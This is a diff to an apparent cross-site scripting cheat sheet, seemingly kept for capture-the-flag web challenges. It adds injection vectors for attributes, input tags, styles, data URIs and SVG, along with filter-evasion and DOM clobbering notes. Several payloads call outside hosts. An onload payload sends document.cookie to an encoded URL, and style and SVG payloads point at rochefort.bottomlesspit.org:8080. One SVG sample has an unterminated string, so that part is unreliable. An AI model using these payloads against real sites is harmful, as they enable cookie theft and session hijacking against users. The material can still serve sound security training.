@@ -6,6 +6,10 @@
 * Web developer tool
 * Python: urllib.quote, 
 
+== Good to know
+
+* svg tag is very useful for firing javascript events
+
 == Injection Vectors
 
 In unfiltered input (remember that X-XSS-Protection might prevent such
@@ -13,7 +17,7 @@ payloads to work in modern browsers, in doubt try with curl)
 
     <script>alert(1)</script>
 
-In HTML attribute
+=== In HTML attribute
 
     <img src=javascript:alert(1) />
 
@@ -22,9 +26,36 @@ Add new HTML attributes
     <body bgcolor='..' onload='new Image().src=String.fromCharCode(104,116,116,...)+document.cookie'>
                      ^ injection
 
+In input tag:
+
+    onfocus="alert('XSS')" autofocus
+
+in style attributes:
+
+    <DIV STYLE="background-image: url(javascript:alert('XSS'))">
+    test" style="background-image: url(http://rochefort.bottomlesspit.org:8080/xss3);
+
 In cookies that are getting showed up on the page
 
-Database
+=== Persistent
+
+via databases, redis, etc.
+
+=== In data-uri
+
+I've done this with embed tags.
+
+Cookies are not accessible inside data-uri.
+
+Use MIME type text/html and use base64 with <script> tags or use svg with
+something like:
+
+    MIME: image/svg+xml
+
+    <svg xmlns:svg="http://www.w3.org/2000/svg" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.0" x="0" y="0" width="194" height="200" id="xss">
+    <script type="text/ecmascript">
+    document.location = 'http://rochefort.bottomlesspit.org:8080/xss
+    </script></svg>
 
 == Anti-filtering
 
@@ -50,6 +81,9 @@ Javascript fancy'ness
 and more
 
     window["Str"+"ing"]["fromCh"+"arCode"](104,116,116,112,58,47,47,109,111,108,110,46,109,97,114,99,101,116,105,101,110,110,101,46,99,111,109,47,99,116,102,63)
+
+* HTML Entities don't work in script tags
+* HTML Entities need to be URL-encoded
 
 == Payloads
 
@@ -110,3 +144,21 @@ See `submit.html` for a sample form.
 ** #... with a limited injection with an eval: eval(location.hash.substr(1))
 * Data URIs
 * Behavior of the fake browser (follows redirects, executes all javascript, detaches when page is first rendered)
+
+== Advanced techniques
+
+=== DOM Clobbering
+
+* http://www.slideshare.net/x00mario/in-the-dom-no-one-will-hear-you-scream
+
+vulnerable
+
+    form method="$FILTERED_USER_INPUT"
+    ...
+    document.write(document.body.id)
+
+to exploit
+
+    method=get%20name=body+id=PAYLOAD
+    form method=
+
